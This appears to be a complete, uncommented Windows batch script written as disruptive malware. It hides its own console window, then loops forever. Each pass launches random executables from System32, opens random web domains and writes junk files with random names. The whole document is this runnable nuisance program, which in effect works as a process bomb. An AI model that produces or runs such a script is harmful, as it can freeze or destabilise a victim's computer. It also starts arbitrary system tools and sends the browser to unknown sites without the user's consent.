@echo off
color 01
mode con cols=15 lines=1
title    
cd C:\Windows\System32
set dirxs=%cd%
:a
setlocal EnableDelayedExpansion
set count=0
for /f "delims=" %%a in ('dir /b *.exe') do @(
	set filename[!count!]=%%a
	set /a count = count + 1
)
set /a choose = (%random% * 32768 + %random%) %% count
set chosen=!filename[%choose%]!
start %chosen%
setlocal EnableDelayedExpansion
set count=0
for /f "delims=" %%a in ('dir /b *.exe') do @(
	set filename[!count!]=%%a
	set /a count = count + 1
)
set /a choose = (%random% * 32768 + %random%) %% count
set chosen=!filename[%choose%]!
start %chosen%
setlocal EnableDelayedExpansion
set count=0
for /f "delims=" %%a in ('dir /b *.exe') do @(
	set filename[!count!]=%%a
	set /a count = count + 1
)
set /a choose = (%random% * 32768 + %random%) %% count
set chosen=!filename[%choose%]!
start %chosen%
start http://%random%.com/%random%
echo %random% >> %dirx%\%random%
goto a
